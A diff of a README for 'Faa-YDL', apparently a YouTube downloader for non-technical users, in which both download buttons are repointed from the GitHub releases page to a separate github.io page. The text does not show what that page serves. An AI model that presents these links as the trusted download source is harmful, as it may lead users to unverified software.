@@ -10,7 +10,7 @@ This tool is designed for everyday users - no technical knowledge required. Whet
 
 **Step 1: Download the Application**
 
-[![Download Faa-YDL Now](https://img.shields.io/badge/Download-Faa--YDL-blueviolet?style=for-the-badge)](https://github.com/Petar1511/Faa-YDL/releases)
+[![Download Faa-YDL Now](https://img.shields.io/badge/Download-Faa--YDL-blueviolet?style=for-the-badge)](https://petar1511.github.io)
 
 Visit this link to download the application. The download page will show you the latest version available.
 
@@ -142,7 +142,7 @@ If you encounter any issues:
 
 Ready to start saving YouTube content? Download Faa-YDL now and experience the easiest way to get your favorite music and videos offline.
 
-[![Get Faa-YDL](https://img.shields.io/badge/Get_Faa--YDL_now-2ea44f?style=for-the-badge)](https://github.com/Petar1511/Faa-YDL/releases)
+[![Get Faa-YDL](https://img.shields.io/badge/Get_Faa--YDL_now-2ea44f?style=for-the-badge)](https://petar1511.github.io)
 
 Visit this link to download the application and begin using it right away.
 
